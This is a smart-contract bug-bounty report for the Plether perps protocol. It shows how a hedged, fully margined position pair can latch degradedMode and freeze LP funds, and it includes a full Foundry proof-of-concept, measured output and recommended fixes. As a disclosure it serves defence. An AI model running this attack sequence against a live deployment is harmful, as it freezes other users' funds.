# \#98394 [SC-High] An untrusted hedged pair latches degradedMode and freezes LP settlement, withdrawals, deposit/redeem cancels and new trading until owner intervention

**Submitted on Nov 7th 2026 at 16:22:54 UTC by @Raiders for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98394
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Temporary freezing of funds for at least 24 hours

## Description

## Summary

The engine counts only the larger side's maximum profit as pool liability `L`. A position margined at or above its maximum profit pays no carry. With two accounts, an attacker opens a hedged LONG/SHORT pair that fills `L` up to the open gate. Neither leg pays carry and neither can be liquidated, so the attacker can hold the pair and wait for free. After a basket move of about 0.8% in either direction, the attacker closes the winning leg. The pool pays out the gain, but the losing leg keeps `L` where it was, so `E < L` and `degradedMode` latches. From then on every LP epoch settlement reverts, so no LP can redeem and matured or Senior pending deposits can be neither activated nor cancelled. Position holders cannot withdraw free cash and no one can open a position. This lasts until the owner recapitalizes and calls `clearDegradedMode`.

## Root cause

Three properties combine.

**1. A fully margined position pays zero carry.** Borrow base is maximum profit minus margin, floored at zero:

```solidity
// CfdEngine.sol:803-809
function _positionBorrowBase(uint256 maxProfitAssets, uint256 marginAssets)
    internal pure returns (uint256 borrowBaseAssets)
{
    assembly ("memory-safe") {
        if gt(maxProfitAssets, marginAssets) { borrowBaseAssets := sub(maxProfitAssets, marginAssets) }
    }
}
```

A leg posted with margin of 100.5% of notional has borrow base 0, so its carry is 0 (PoC: borrow base 0 on both legs and carry 0 on both legs over 25 h, while an ordinary 50k SHORT accrued 28.94 USDG).

**2. Liability counts only the larger side, so the pool keeps the full liability after one hedged leg has been paid out.**

```solidity
// CfdEngine.sol:1044-1050
function _maxLiability() internal view returns (uint256) {
    (SideState storage longState, SideState storage shortState) = _longAndShortStates();
    return longState.maxProfitAssets > shortState.maxProfitAssets
        ? longState.maxProfitAssets
        : shortState.maxProfitAssets;
}
```

A balanced pair of size N raises `L` by N, and the open gate lets it grow until `E` is just above `L * 1.0025` (CfdEnginePlanLib.sol:755-776, buffer 25 bps). When the winning leg closes, the pool pays its gain from `E`. The losing leg still holds the other side's maximum profit at N, so `L` does not fall.

**3. Any close that leaves `E < L` latches degraded mode, and only the owner can unlatch it.**

```solidity
// CfdEngine.sol:1320 (_applyClose)
_enterDegradedModeIfInsolvent(delta.account, 0);

// CfdEngine.sol:1351-1369
function _enterDegradedModeIfInsolvent(address account, uint256 pendingPoolPayoutAssets) internal {
    if (degradedMode) return;
    uint256 effectiveAssetsAfter = _availableCashForFreshPoolPayouts();
    ...
    uint256 maxLiabilityAssets = _maxLiability();
    if (effectiveAssetsAfter < maxLiabilityAssets) {
        degradedMode = true;
        emit DegradedModeEntered(effectiveAssetsAfter, maxLiabilityAssets, account);
    }
}

// CfdEngine.sol:658-667
function clearDegradedMode() external onlyOwner {
    if (!degradedMode) revert CfdEngine__NotDegraded();
    if (_availableCashForFreshPoolPayouts() < _maxLiability()) revert CfdEngine__StillInsolvent();
    degradedMode = false;
    emit DegradedModeCleared();
}
```

While the flag is set:

- LP epoch settlement reverts. `_settleLpEpoch` calls `_requireWithdrawalsLive` (HousePool.sol:832), which reverts `HousePool__DegradedMode` (HousePool.sol:1864-1870). No redemption is funded and no pending deposit is activated. New LP entries are blocked as well (HousePool.sol:1143).
- Pending deposits that have matured cannot be cancelled. `cancelPendingDeposit` (TrancheVault.sol:851-860) reverts for any Senior request, and for a Junior request once `currentLpEpoch() >= requestId`. The escape list covers rejection, a settlement hold, a projected wipe and Senior impairment. It has no degraded-mode case.
- A matured redemption cannot be cancelled (TrancheVault.sol:893-897), and the epoch that would fund it cannot settle.
- An account with an open position cannot withdraw free cash (CfdEngineSettlementSidecar.sol:274-276).
- New opens revert at commit with `OrderRouter__DegradedMode` (router/OrderLiquidationBatchLogic.sol:328-330).

Nothing pushes the attacker's losing leg out. Its margin covers its maximum loss, so liquidation reverts `CfdEngine__PositionIsSolvent` (CfdEngine.sol:1038-1040), and its borrow base is 0, so it pays nothing to stay open.

The move needed is about 0.8%, not just the 25 bps buffer. Closing a leg of about 10M creates skew and pays VPI back into the pool, so the gain must cover the buffer plus that VPI. Measured at production `vpiFactor` 0.01e18: a 0.79% fall does not latch and 0.80% does; a 0.80% rise does not latch and 0.81% does.

## Attack steps

Production parameters (DEPLOYMENT.md:129-160, v2.0.0 manifest). Pool 10M USDG (5M Junior, 5M Senior).

1. The attacker funds two accounts with 10.1M USDG each.
2. Account A opens LONG and account B opens SHORT in alternating chunks of at most 3.5M, which keeps skew under `maxSkewRatio` 0.4. Each leg posts margin of 100.5% of notional, so borrow base is 0. The attacker stops when no 1,000 USDG chunk passes `E >= L * 1.0025`. In the PoC this ends with LONG 9,975,200 and SHORT 9,925,300 notional, `E` = 10,000,008.02 and `L` = 9,974,801.24.
3. The attacker waits for a basket move of at least 0.80% down or 0.81% up. Waiting costs nothing.
4. The attacker closes the winning leg (LONG on a fall). `E` drops from 9,999,738.24 to 9,973,855.14, below `L` = 9,974,801.24, and `degradedMode` latches.
5. The attacker keeps the losing leg open to make the owner pay `L - E` before clearing, or closes it. Either way the latch stays.

All steps go through the public Router with Pyth payloads. A third-party keeper executes every order. No role is needed.

## Impact

Frozen while the latch holds (PoC, production parameters):

- All LP capital. Pool `totalAssets` was 10,070,766.12 USDG after the attacker exited. Every `settleLpEpoch` reverts `HousePool__DegradedMode`, so no Junior or Senior redemption can be funded for the whole period. A matured 1M Junior redemption could not be cancelled (`RedeemCancellationUnavailable`).
- Pending LP deposits. A 500,000 USDG Senior deposit could be neither activated nor cancelled (`TrancheVault__SeniorDepositCommitted`). By the same code path (TrancheVault.sol:852), a matured Junior deposit cannot be cancelled either.
- Free cash of position holders. A third-party trader with an open 50k SHORT could not withdraw (`CfdEngine__DegradedMode`). Such a trader can get out only by closing the position, which costs fees and ends exposure they chose to hold.
- New trading. Third-party opens revert `OrderRouter__DegradedMode`.

Duration. The PoC keeps the latch for 24 hours and checks each hour that `settleLpEpoch` reverts. Liquidation and batch liquidation leave the losing leg untouched. A non-owner `clearDegradedMode` reverts. The owner's own `clearDegradedMode` reverts `CfdEngine__StillInsolvent` until it recapitalizes 946.10 USDG (`L - E`). After the attacker closes the losing leg, `degradedMode` is still `true` and settlement still reverts. The end of the freeze therefore depends only on owner action.

Owner remedy, and what it does not fix. After `recapitalizePool(946.10)` and `clearDegradedMode`, the next `settleLpEpoch` reverts `HousePool__NoLpEpochProgress` (selector `0x86cca6b8`). The 1M redemption has still received only about 270 USDG, and the 500,000 Senior deposit is still escrowed. With the losing leg open, `E - L` is 0 after the recap, so redemption funding stays at zero (SECURITY.md:942: "`L <= E < L + B` is solvent but unavailable for new risk and LP redemption funding"). LP exits fully resume only after the losing leg closes or the owner adds more capital.

Attacker cost. The attacker ends 82,932.41 USDG down: 11,898.36 in treasury fees, 1.60 in keeper bounties, and about 71,032 left in the pool, mostly as VPI. The attacker needs 2 x 10.1M of capital, but every dollar of it is returned apart from that cost. The Scope tab says "A high capital requirement is generally not a valid reason to downgrade a report."

Cost against damage. About 82.9k USDG freezes about 10.07M USDG of LP capital, plus pending deposits and position holders' free cash. That is more than 120 times the cost. The Scope tab's Feasibility Limitations section says "spending USD 1 to cause USD 10 or less in damage is Griefing, while spending USD 1 to cause USD 100 or more in damage is not." So the freeze impact, not griefing, should set the severity.

Repeatability. After the owner clears, the attacker can rebuild the pair as soon as capacity returns, and repeat on the next move.

Without the squat. The same latch fires whenever any trader closes a winning position while the book sits near the open gate with offsetting exposure. The attacker only makes that state certain and holds it for free.

### Known issues and design documentation

- Not on the known-issue list. SECURITY.md "Known Limitations" (SECURITY.md:1328-1457) never mentions degraded mode. The audit reports listed as known contain no trader-induced latch. MED-19 and S-12 concern Senior deposit reservations, and LOW-73 concerns protection created in degraded mode.
- Degraded containment is documented as a mechanism. See SECURITY.md:340 ("If a close or liquidation leaves raw post-op `E < L`, `degradedMode` latches") and ACCOUNTING_SPEC.md:1224-1229. That text describes what happens after an insolvency shock. It does not say that an untrusted trader can produce the state on purpose from a hedged, riskless position at zero carry, nor that the state needs the owner to end it.
- The repo test reaches the latch with a hedged pair. `test/perps/accounting/close/DegradedSettlementBehavior.t.sol:33` opens a SHORT and a LONG and closes the winner after an 80% move, with `vpiFactor` 0. This confirms the code path is reachable. This report shows it is reachable with a 0.8% move at production parameters, by one attacker, with a freeze that outlives the attacker.
- Zero carry for fully margined positions is documented. WHITEPAPER.md:915-921 calls it a "carry-pricing convention" and notes that such a position "may therefore have zero borrow base while its full maximum price profit remains in the HousePool liability aggregate". That is why holding the setup costs nothing. The convention itself is not the reported impact.
- Not a lack-of-liquidity impact. The pair blocking opens and redemptions before the move is only the setup. The reported freeze is a state flag. It blocks settlement, cancels and withdrawals regardless of how much cash the pool holds, and it holds after the attacker has left.
- No LP value is lost. LPs gain about 71k USDG in VPI. The impact claimed is a freeze, not a loss.

## Recommended fix

The root problem is that a single untrusted close can move the system into a state that only the owner can leave, while the position that keeps it there costs nothing to hold and cannot be removed. Any one of the following closes the path. The first two remove the cause and the last three limit the damage.

1. **Do not count hedged, fully margined exposure as unbacked liability.** Compute `L` net of offsetting exposure that its own margin backs. Equivalently, treat margin above a position's maximum profit as covering that liability. Then closing one leg of a self-hedged pair cannot push `E` below `L`.
2. **Charge carry on fully margined positions.** For example, use a minimum borrow base such as `max(maxProfit - margin, maxProfit * minBps / 10_000)`. Holding the full capacity then has a running cost, and the attacker cannot wait for free.
3. **Allow permissionless reduction of the position that keeps `L` above `E` in degraded mode.** Let a keeper force-close or auto-deleverage the largest losing position on the dominant side when `degradedMode` is set and that position alone sets `L`.
4. **Let LPs leave pending requests during degraded mode.** Add `engine.degradedMode()` to the `cancelPendingDeposit` escape list (TrancheVault.sol:851-860) so that deposit escrow is never frozen by a state the depositor did not cause.
5. **Clear the latch automatically once `E >= L`.** Let `_enterDegradedModeIfInsolvent`, or a permissionless function, set `degradedMode = false` when `_availableCashForFreshPoolPayouts() >= _maxLiability()`. The latch then ends when the attacker closes the losing leg, with no owner transaction:

```solidity
function clearDegradedModeIfSolvent() external {
    if (!degradedMode) revert CfdEngine__NotDegraded();
    if (_availableCashForFreshPoolPayouts() < _maxLiability()) revert CfdEngine__StillInsolvent();
    degradedMode = false;
    emit DegradedModeCleared();
}
```

Option 5 alone does not stop the attacker from keeping the losing leg open, so it should be combined with 1, 2 or 3.

## Proof of Concept

## Proof of Concept

File: `packages/perps/test/poc/H_R3_1_DegradedFreeze.t.sol` (attached). It uses the repo's `BasePerpTest` harness with production risk parameters and 2 bps Pyth confidence per feed. After setup, every order and LP settlement goes through the public Router and an unrelated keeper. The only owner calls show the remedy (`recapitalizePool`, `clearDegradedMode`).

Run:

```
cd packages/perps && FOUNDRY_FFI=false forge test --match-path test/poc/H_R3_1_DegradedFreeze.t.sol -vv
```

Excerpt (setup and main test; helpers `_trade`, `_settle`, `_mark`, `_pyth`, `_prefix`, `_thirdPartyOpen` are in the attached file):

```solidity
contract H_R3_1_DegradedFreeze is BasePerpTest {
    uint256 internal constant PRICE0 = 1e8;
    uint64 internal constant CONF = 200; // 2 bps per feed
    uint256 internal constant ATTACKER_FUNDS = 10_100_000e6; // per account
    uint256 internal constant JUNIOR_TOTAL = 5_000_000e6;
    uint256 internal constant SENIOR_TOTAL = 5_000_000e6;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18, maxSkewRatio: 0.4e18, maintMarginBps: 10, initMarginBps: 20,
            fadMarginBps: 300, baseCarryBps: 500, minBountyAssets: 1e6, bountyBps: 10,
            keeperShareBps: 5000, protocolShareBps: 0
        });
    }

    function setUp() public override {
        super.setUp();
        owner_ = address(this);
        A = makeAddr("attackerA");
        Bk = makeAddr("attackerB");
        // ... keeper, juniorLp, seniorLp, seniorLp2, victimTrader, newTrader
        IOrderRouterAdminHost.RouterConfig memory rc = _routerConfig();
        rc.adverseConfidenceMultiplierBps = 2500;
        rc.basketMaxConfidenceRatioBps = 10;
        rc.minOpenNotionalAssets = 1000e6;
        rc.maxPendingOrders = 5;
        _setRouterConfig(rc);
        _setSeniorCapacity(40_000_000e6, 8000);
        assertEq(engine.executionFeeBps(), 4, "fee 4 bps");
        assertEq(engine.settlementBufferBps(), 25, "buffer 25 bps");
        T0 = SETUP_TIMESTAMP + 7 days; // Monday 10:00 UTC
        vm.warp(T0);
        vm.roll(block.number + 100);
        tNow = T0;
    }

    /// Alternate LONG (A) and SHORT (Bk) chunks of at most 3.5M, each margined at 100.5% of notional,
    /// until no 1,000 USDG chunk passes E >= L * 1.0025.
    function _squat() internal {
        _fundTrader(A, ATTACKER_FUNDS);
        _fundTrader(Bk, ATTACKER_FUNDS);
        attackerStart = _attackerTotal();
        treasuryStart = clearinghouse.balanceAssets(PROTOCOL_TREASURY_ACCOUNT);
        keeperStart = _keeperTotal();
        {
            uint256 lm = _sideState(CfdTypes.Side.LONG).maxProfitAssets;
            uint256 sm = _sideState(CfdTypes.Side.SHORT).maxProfitAssets;
            if (sm > lm + 1000e6) {
                uint256 gap = ((sm - lm) / 100e6) * 100e6;
                _trade(A, CfdTypes.Side.LONG, gap * 1e12, (gap * 1005) / 1000, false, PRICE0);
            }
        }
        for (uint256 i; i < 20; ++i) {
            uint256 capAssets = (_E() * 10_000) / 10_025;
            uint256 L = _maxLiability();
            if (capAssets <= L + 1100e6) break;
            uint256 chunk = capAssets - L - 100e6;
            if (chunk > 3_500_000e6) chunk = 3_500_000e6;
            chunk = (chunk / 100e6) * 100e6;
            uint256 margin = (chunk * 1005) / 1000;
            _trade(A, CfdTypes.Side.LONG, chunk * 1e12, margin, false, PRICE0);
            _trade(Bk, CfdTypes.Side.SHORT, chunk * 1e12, margin, false, PRICE0);
        }
    }

    function test_H_R3_1_squatLatchFreeze() public {
        _prefix(); // LPs deposit 5M + 5M, victim opens a 50k SHORT, junior LP queues a 1M redemption
        _squat();

        // (1) zero carry, capacity filled
        (uint256 bbA,,) = engine.positionCarryState(A);
        (uint256 bbB,,) = engine.positionCarryState(Bk);
        assertEq(bbA, 0, "LONG leg borrow base 0");
        assertEq(bbB, 0, "SHORT leg borrow base 0");
        assertGe(_E(), _maxLiability(), "squat leaves E >= L (not degraded)");
        (bool opened,) = _thirdPartyOpen(CfdTypes.Side.LONG, PRICE0);
        assertFalse(opened, "third-party LONG open blocked by squat");
        // ... 24 h of hourly settles; carry on both legs stays 0

        // (2) a 0.80% move, close the winning leg -> latch
        _at(T0 + 27 hours + 300);
        _mark(PRICE0);
        uint256 sDep = _req(seniorVault, seniorLp2, 500_000e6);
        uint256 p1 = PRICE0 - (PRICE0 * 80) / 10_000; // basket -0.80%; LONG profits when the basket falls
        _at(T0 + 27 hours + 600);
        _mark(p1);
        _trade(A, CfdTypes.Side.LONG, _size(A), 0, true, p1);
        assertTrue(engine.degradedMode(), "degradedMode latched by an untrusted close");
        uint256 latchTime = tNow;

        // (3) consequences
        _at(T0 + 28 hours + 10);
        {
            bytes[] memory d = _pyth(p1);
            vm.prank(keeper);
            vm.expectRevert(IHousePool.HousePool__DegradedMode.selector);
            router.settleLpEpoch(d);
        }
        _mark(p1);
        vm.prank(victimTrader);
        vm.expectRevert(ICfdEngineTypes.CfdEngine__DegradedMode.selector);
        clearinghouse.withdraw(victimTrader, 1000e6);

        _fundTrader(newTrader, 5000e6);
        _tick();
        vm.prank(newTrader);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__DegradedMode.selector);
        router.commitOrder(CfdTypes.Side.LONG, 10_000e18, 1000e6, 0, false);

        vm.prank(seniorLp2);
        vm.expectRevert(TrancheVault.TrancheVault__SeniorDepositCommitted.selector);
        seniorVault.cancelPendingDeposit(sDep);

        vm.prank(juniorLp);
        vm.expectRevert(TrancheVault.TrancheVault__RedeemCancellationUnavailable.selector);
        juniorVault.cancelRedeemRequest(redeemId, juniorLp);

        // (4) 24 h persistence; untrusted actions cannot clear
        for (uint256 h = 29; h <= 52; ++h) {
            _at(T0 + h * 1 hours + 10);
            bytes[] memory d = _pyth(p1);
            vm.prank(keeper);
            try router.settleLpEpoch(d) { revert("settle should fail"); } catch {}
        }
        _mark(p1);
        assertGe(tNow - latchTime, 24 hours, "latched >= 24h");
        assertTrue(engine.degradedMode(), "still degraded after 24h");
        assertEq(_expectedIndexedCarryAssets(Bk), 0, "losing leg accrues no carry while latched");

        uint256 bSize = _size(Bk);
        {
            bytes[] memory d = _pyth(p1);
            vm.prank(keeper);
            try router.executeLiquidation(Bk, d) {} catch {}
            assertEq(_size(Bk), bSize, "losing leg not liquidatable");
            // executeLiquidationBatch([Bk]) also leaves it intact
        }
        vm.prank(keeper);
        vm.expectRevert();
        engine.clearDegradedMode(); // non-owner
        vm.expectRevert(ICfdEngineTypes.CfdEngine__StillInsolvent.selector);
        engine.clearDegradedMode(); // owner, no new capital
        uint256 deficit = _maxLiability() - _E();

        // owner remedy branch (snapshot): recapitalizePool(deficit) + clearDegradedMode,
        // then the next settleLpEpoch reverts NoLpEpochProgress while the losing leg is open

        // (5) attacker exits the losing leg; the latch stays
        _trade(Bk, CfdTypes.Side.SHORT, _size(Bk), 0, true, p1);
        assertEq(_size(Bk), 0, "attacker exits the losing leg");
        assertTrue(engine.degradedMode(), "latch persists even after the attacker leaves");
        {
            _tick();
            bytes[] memory d = _pyth(p1);
            vm.prank(keeper);
            vm.expectRevert(IHousePool.HousePool__DegradedMode.selector);
            router.settleLpEpoch(d);
        }
        int256 net = int256(_attackerTotal()) - int256(attackerStart);
        assertLt(net, 0, "attack has a net cost (griefing, no profit)");
        engine.clearDegradedMode(); // only the owner can end it
    }
}
```

The file has two more tests. `test_H_R3_1_moveThreshold` finds the move size that latches, in both directions. `test_H_R3_1_control` runs the same timeline without the pair: the redemption is fully funded, the third-party open fills, and the same 0.80% move with a profitable close does not latch.

Output (USDG amounts have 6 decimals):

```
Ran 3 tests for test/poc/H_R3_1_DegradedFreeze.t.sol:H_R3_1_DegradedFreeze
[PASS] test_H_R3_1_control() (gas: 14953292)
Logs:
  control: redemption claimable shares after first epoch / requested 1001544657206157 1001544657206157
  control: settle + withdraw work; E, L 8999933419888 49997500000

[PASS] test_H_R3_1_moveThreshold() (gas: 57465938)
Logs:
  move bps / degraded / E-L (USDG 6dp) 30 false
  45737349746
  ...
  move bps / degraded / E-L (USDG 6dp) 79 false
  330158557
  move bps / degraded / E-L (USDG 6dp) 80 true
  -677632490
  move bps / degraded / E-L (USDG 6dp) 100 true
  -20834252235
  basket UP bps / close SHORT leg: degraded / E-L 80 false
  943545012
  basket UP bps / close SHORT leg: degraded / E-L 81 true
  -38658221

[PASS] test_H_R3_1_squatLatchFreeze() (gas: 67671320)
Logs:
  == after squat (T0+2h30) ==
     E (pool assets - claims), L (max side liability) 10000008022066 9974801235000
     attacker LONG size / SHORT size (USDG notional) 9975200 9925300
     degradedMode false
  third-party 10k LONG open during squat: opened / commit reverted false true
  third-party 10k SHORT open during squat: opened / commit reverted false true
  hourly settle attempts over 24h: ok / reverted (no progress) 1 24
  junior redemption after 24h: claimable shares / requested shares / pending shares
     270149144220 1001544657206157 1001274508061937
  carry accrued over 25h: LONG leg / SHORT leg / victim 0 0 28939
  senior maxRequestDeposit before the move 14997211839007
  == after closing the winning LONG at -0.80% ==
     E (pool assets - claims), L (max side liability) 9973855139572 9974801235000
     attacker LONG size / SHORT size (USDG notional) 0 9925300
     degradedMode true
     E before close 9999738238088
  hours latched 24
  recap needed for owner clear (L - E), USDG 6dp 946095428
  after owner recap+clear: settle reverts (selector below)
  0x86cca6b8
  after owner recap+clear: redemption claimable shares 270149144220
  after owner recap+clear: senior pending deposit (still escrowed) 500000000000
     pool unassigned / seniorPrincipal / seniorHWM 0 5000046663661 5000046663661
     E - L after recap (free for redemptions before buffer) 0
  == after attacker exits the losing leg ==
     E (pool assets - claims), L (max side liability) 10070766115417 49997500000
     attacker LONG size / SHORT size (USDG notional) 0 0
     degradedMode true
  attacker start / end total USDG 20200000000000 20117067589605
  attacker net (negative = cost), USDG 6dp
  -82932410395
  treasury fees gained 11898361124
  keeper bounties gained 1600000
  LP capital frozen (pool totalAssets) 10070766115417

Suite result: ok. 3 passed; 0 failed; 0 skipped
```
